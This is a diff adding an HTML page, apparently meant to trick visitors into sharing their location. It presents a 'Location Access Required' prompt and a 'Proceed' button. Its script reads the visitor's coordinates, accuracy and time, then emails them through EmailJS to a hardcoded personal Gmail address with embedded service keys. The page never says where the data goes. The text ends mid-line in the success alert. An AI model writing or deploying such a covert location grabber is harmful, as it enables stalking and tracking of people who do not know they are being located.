@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Share My Location</title>
+
+<!-- Latest supported EmailJS SDK -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script>
+  // Initialize EmailJS with your Public Key
+  (function(){
+    emailjs.init('1BnbYAfQB-gBYaS_4'); // Replace with your Public Key
+  })();
+</script>
+</head>
+<body style="font-family: Arial, sans-serif; text-align: center; padding-top: 50px;">
+
+<h2>Location Access Required</h2>
+<p>Click the button below. Your browser will ask for location permission.</p>
+
+<button id="locBtn" style="padding: 12px 20px; font-size: 16px; cursor: pointer;">
+  Proceed (Requires Location Permission)
+</button>
+
+<script>
+document.getElementById('locBtn').addEventListener('click', function() {
+  if (!navigator.geolocation) {
+    alert('Your browser does not support location access.');
+    return;
+  }
+
+  navigator.geolocation.getCurrentPosition(
+    function(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      const accuracy = position.coords.accuracy;
+      const timestamp = new Date(position.timestamp).toLocaleString();
+
+      // Send location using EmailJS
+      emailjs.send('service_6z384m7', 'template_fpeqab4', {
+        lat: lat,
+        lon: lon,
+        accuracy: accuracy,
+        timestamp: timestamp,
+        to_email: 'seancarl343@gmail.com'
+      })
+      .then(function(response) {
+        alert('Location sent successf
